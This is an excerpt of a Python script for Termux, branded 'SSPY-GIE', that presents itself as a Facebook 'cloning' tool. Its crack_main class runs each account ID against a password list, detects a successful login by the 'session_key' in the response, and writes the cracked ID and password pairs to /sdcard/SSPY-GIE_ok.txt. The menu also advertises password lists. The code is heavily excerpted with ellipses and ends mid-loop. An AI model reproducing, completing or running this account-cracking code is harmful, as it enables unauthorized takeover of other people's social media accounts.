...
╚══════╝╚══════╝╚═╝        ╚═╝         ╚═════╝ ╚═╝╚══════╝
     ...
     [✓] GitHub Account • https://github.com/SsPyGie09
{59*"-"}
...
def main():
        ...
        os.system('clear')
        print(logo);xchker()
        print('                 ⚜️ CHOICE ONE AND ENTER ⚜️')
        print(59*'-')
        print('[1] ⚜️ Fb Cloning Menu')
        print('[2] ⚜️ File Create Menu')
        print('[3] ⚜️ Contact Admin')
        print('[4] ⚜️ Remove Cookie')
        print('[5] ⚜️ Clear Cache')
        print('[6] ⚜️ Best Pass Lists')
        print('[7] ⚜️ Join Group')
        print(59*'-')
        ...
        if menu_opt =='1':
                ...
                xchker()
                os.system('xdg-open https://m.facebook.com/100081181806160/ ')
                main()
        elif menu_opt =='4':
...
class crack_main():
        ...
        def m1(self,iid,name,passlist):
                try:
                        ...
                        sys.stdout.write('\r[SSPY-GIE] %s / [OK-%s] \r'%(loop,len(ok)));sys.stdout.flush()
                        fn = name.split(' ')[0]
                        try:
                                ln = name.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in po:
                                        print(' \033[1;32m[SSPY-GIE-OK] '+roid+' | '+pas+'\033[0;97m')
                                        open('/sdcard/SSPY-GIE_ok.txt','a').write(roid+'|'+pas+'\n')
                                        ok.append(iid)
                                        break
        ...
        def pasw(self):
                passlist = []
                if not os.path.exists('country_infor.txt'):
                        os.system('clear')
                        print(logo)
                        print(" where are you from?")
                        version_=input(' type country : ')
                        print(59*'-')
                        print(" How Old Are You? ")
                        model_=input(" Age Info : ")
                        print(59*"-")
                        print(" Your Phone Is 64 Or 32 Bit?")
                        brand_name_=input(" device Bit Info : ")
                        print(59*'-')
                        print(" Country Sim Code")
                        height_=input(" Sim Code : ")
                        info_file = open("device_info.txt","a").write(version_+'$'+model_+'$'+brand_name_+'$'+height_)
                os.system('clear')                                	
                print(logo);xchker()
                ...
                print(' Ok Ids Save In : /sdcard/SSPY-GIE_ok.txt')
                print(59*'-')
                input('\n Press enter to back ')
                main()
...
datar = []
datar.append(pat)
if '/data/data/com.termux/files/home/SSPY-GIE' in datar:
        pass
else:
        for i in range(5000):
